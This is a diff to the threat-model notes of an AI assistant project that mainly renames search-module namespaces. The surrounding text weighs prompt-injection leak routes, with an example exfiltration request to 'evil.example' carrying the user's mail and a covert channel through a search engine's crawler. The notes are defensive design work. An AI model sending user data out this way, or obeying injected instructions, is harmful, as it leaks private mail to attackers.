@@ -61,7 +61,7 @@ See `Q_prompt_home`.
 pikuri-tui's computer shell keeps the web behind a quarantined `RESEARCHER` that you approve per
 task, because `fetch` lets the *caller* choose the host: `GET https://evil.example/?d=<your mail>`.
 A search-only agent has no such leg. Its only egress is a query to an engine this code picks, and
-pikuri already grades it that way: `WebSearch.build` declares
+pikuri already grades it that way: `Web::Search.build` declares
 `egress_payload_review: :unreviewed, egress_destination: :tool_vouched`. A secret can be pushed out
 inside a query, but an attacker can't read it back.
 
@@ -72,10 +72,10 @@ What it still has:
   (`untrusted: :hard`). An injection can still steer a draft, a note, a reminder or a memory edit.
 - **Leaks to the provider.** A query that quotes your mail lands in Brave's or Exa's logs. Exa's
   ToS also grants it a perpetual license to train on queries (see the rdoc of pikuri's
-  `Search::Exa`). That isn't exfiltration to an attacker, but it is a privacy cost. Hence the
+  `Web::Search::Exa`). That isn't exfiltration to an attacker, but it is a privacy cost. Hence the
   search-confirm switch below.
 - **Usefulness.** Snippets only. For an assistant that's mostly enough; otherwise the user opens
-  the link. pikuri's `WebSearch::DESCRIPTION` currently tells the model to follow up with
+  the link. pikuri's `Web::Search::DESCRIPTION` currently tells the model to follow up with
   `web_scrape`, which is wrong here. See `Q_search_description`.
 
 ## Approve each search, or accept leaks to the engine
@@ -193,7 +193,7 @@ pikuri's Exa engine calls only `POST https://api.exa.ai/search`, never `/content
 
 The risk was a covert channel: an attacker who owns pages in Exa's index, each matching a different
 secret-dependent query, sees in their logs which page Exa's crawler fetched. **Fixed upstream in
-pikuri `fef8288` (2026-11-10):** `Search::Exa.request_body` sends
+pikuri `fef8288` (2026-11-10):** `Web::Search::Exa.request_body` sends
 `contents: { highlights: true, maxAgeHours: -1 }`. Brave and DuckDuckGo are believed not to fetch
 on our behalf, [unverified]. This finding belongs in pikuri's research register; it stays here
 until it's there.
@@ -220,9 +220,9 @@ tools. If practice shows that hop is constant, v2 is worth building.
 
 - `Q_siri_send`: can Siri on the Mac send a mail or create an event *without* a click? Try
   "email Alice that I'm late" and "add lunch with Bob tomorrow to my calendar".
-- `Q_gate_primitive`: `WebSearch.build` takes no confirmer, so a gated search is a missing pikuri
+- `Q_gate_primitive`: `Web::Search.build` takes no confirmer, so a gated search is a missing pikuri
   primitive (a `confirmer:` kwarg that also flips the leg to `:human_reviewed`).
-- `Q_search_description`: pikuri needs a `WebSearch::DESCRIPTION` variant ("snippets are all you
+- `Q_search_description`: pikuri needs a `Web::Search::DESCRIPTION` variant ("snippets are all you
   get").
 - `Q_search_confirm_ux`: confirm each search in a popup, or default to free searches with a
   per-conversation "searches go to Brave" banner?
